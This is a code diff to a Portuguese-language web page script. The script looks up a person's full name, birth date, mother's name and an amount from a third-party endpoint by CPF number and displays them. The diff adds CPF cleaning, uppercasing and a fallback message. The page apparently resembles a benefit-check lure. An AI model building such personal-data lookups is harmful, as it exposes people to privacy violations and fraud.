@@ -238,14 +238,20 @@ if (nasc) document.getElementById('dadoNasc').textContent = nasc;
 if (mae)  document.getElementById('dadoMae').textContent  = mae;
 
 if (cpf && (!nome || !nasc || !mae)) {
-  fetch('https://consultasaldo.org/wp-json/cpf/v1/consultar?cpf=' + cpf)
+  var cleanCpf = cpf.replace(/\D/g, '');
+  fetch('https://consultasaldo.org/wp-json/cpf/v1/consultar?cpf=' + cleanCpf)
     .then(function(r) { return r.json(); })
     .then(function(d) {
-      if (d.nome)       { document.getElementById('dadoNome').textContent = d.nome; nome = d.nome; }
+      if (d.nome)       { document.getElementById('dadoNome').textContent = d.nome.toUpperCase(); nome = d.nome; }
       if (d.nascimento) { document.getElementById('dadoNasc').textContent = d.nascimento; nasc = d.nascimento; }
-      if (d.nome_mae)   { document.getElementById('dadoMae').textContent  = d.nome_mae;  mae  = d.nome_mae;  }
+      if (d.nome_mae)   { document.getElementById('dadoMae').textContent  = d.nome_mae.toUpperCase();  mae  = d.nome_mae;  }
       if (d.valor)      { valor = d.valor; }
-    }).catch(function() {});
+    }).catch(function() {
+      // Fallback display if fetch fails
+      document.getElementById('dadoNome').textContent = 'NÃO IDENTIFICADO';
+      document.getElementById('dadoNasc').textContent = 'NÃO IDENTIFICADO';
+      document.getElementById('dadoMae').textContent  = 'NÃO IDENTIFICADO';
+    });
 }
 
 (function(){
